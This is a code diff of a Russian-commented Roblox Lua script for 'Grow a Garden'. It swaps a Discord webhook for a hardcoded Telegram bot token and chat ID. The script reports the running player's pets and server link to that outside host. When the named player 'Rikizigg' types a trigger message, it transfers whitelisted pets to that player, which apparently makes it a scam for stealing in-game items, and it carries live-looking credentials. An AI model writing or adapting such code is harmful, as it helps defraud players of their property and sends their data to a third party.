@@ -6,19 +6,27 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
 -- 🔧 НАСТРОЙКИ
-local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1401556845847646329/FeLb65sSQ660GjWF0PyUZGFpWb5ndW-9CZmY6Vw2rz-E0jEBqS886LFoLAaG4O4aG4SR"
+local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE" -- Получить у @BotFather
+local TELEGRAM_CHAT_ID = "7144575011" -- Числовой ID чата
 local TARGET_PLAYER = "Rikizigg" -- Ник получателя
 local TRIGGER_MESSAGE = "." -- Сообщение-триггер в чате
 local DELAY_BETWEEN_ACTIONS = 1 -- Задержка между действиями (секунды)
 
--- 🐾 Получить всех питомцев в инвентаре
-local function getAllPets()
+-- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ (точные названия)
+local WHITELIST = {
+    "Hamster",
+    -- Добавьте других питомцев
+}
+
+-- 🎒 Получить только питомцев из белого списка
+local function getWhitelistedPets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
     
-    for _, item in ipairs(backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            table.insert(pets, item.Name)
+    for _, petName in ipairs(WHITELIST) do
+        local pet = backpack:FindFirstChild(petName)
+        if pet then
+            table.insert(pets, pet.Name)
         end
     end
     
@@ -49,50 +57,69 @@ local function transferPet(petName)
     return false
 end
 
--- 📨 Форматирование Discord-уведомления
-local function createEmbed(petsList)
-    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
+-- 📨 Отправить уведомление в Telegram
+local function sendToTelegram(text)
+    local url = string.format(
+        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+        TELEGRAM_TOKEN,
+        TELEGRAM_CHAT_ID,
+        HttpService:UrlEncode(text)
+    )
     
-    return {
-        content = "🔄 Готов к передаче питомцев!",
-        embeds = {{
-            title = "Grow a Garden - Pet Transfer System",
-            color = 16753920, -- Оранжевый
-            fields = {
-                {name = "📌 Отправитель", value = player.Name, inline = true},
-                {name = "🎯 Получатель", value = TARGET_PLAYER, inline = true},
-                {name = "🔗 Подключиться к серверу", value = "[Кликните здесь]("..serverLink..")", inline = false},
-                {name = "🐾 Питомцы в инвентаре ("..#petsList..")", value = "```"..table.concat(petsList, "\n").."```", inline = false}
-            },
-            footer = {text = "Ожидаю команду '"..TRIGGER_MESSAGE.."' в чате"},
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
+    local success, response = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if not success then
+        warn("Ошибка отправки в Telegram:", response)
+    end
 end
 
--- 📤 Отправить уведомление в Discord
-local function sendInventoryUpdate()
-    local pets = getAllPets()
-    local data = createEmbed(pets)
+-- 📝 Формирование сообщения для Telegram
+local function createTelegramMessage(petsList)
+    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
     
-    pcall(function()
-        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(data))
-    end)
+    return string.format(
+        "🔄 *Grow a Garden - Pet Transfer*\n"..
+        "👤 *Отправитель:* %s\n"..
+        "🎯 *Получатель:* %s\n"..
+        "🔗 *Сервер:* [Кликните здесь](%s)\n\n"..
+        "🐾 *Питомцы (%d):*\n```\n%s\n```\n\n"..
+        "_Ожидаю команду '%s' в чате_",
+        player.Name,
+        TARGET_PLAYER,
+        serverLink,
+        #petsList,
+        table.concat(petsList, "\n"),
+        TRIGGER_MESSAGE
+    )
 end
 
 -- 👂 Обработчик чата
 local function onChatMessage(message, speaker)
     if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
-        local pets = getAllPets()
+        local pets = getWhitelistedPets()
         
+        if #pets == 0 then
+            sendToTelegram("❌ Нет питомцев из белого списка!")
+            return
+        end
+        
+        -- Отправляем начальное уведомление
+        sendToTelegram(createTelegramMessage(pets))
+        
+        -- Передаем каждого питомца
         for _, petName in ipairs(pets) do
             if transferPet(petName) then
-                print("✅ Успешно передан:", petName)
+                sendToTelegram("✅ Успешно передан: "..petName)
                 task.wait(DELAY_BETWEEN_ACTIONS)
+            else
+                sendToTelegram("❌ Ошибка при передаче: "..petName)
             end
         end
         
-        sendInventoryUpdate() -- Обновляем статус после передачи
+        -- Итоговое уведомление
+        sendToTelegram("🏁 Передача завершена! Всего передано: "..#pets)
     end
 end
 
@@ -110,5 +137,5 @@ else
 end
 
 -- 🚀 Инициализация
-sendInventoryUpdate()
+sendToTelegram(createTelegramMessage(getWhitelistedPets()))
 print("✅ Система активирована. Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
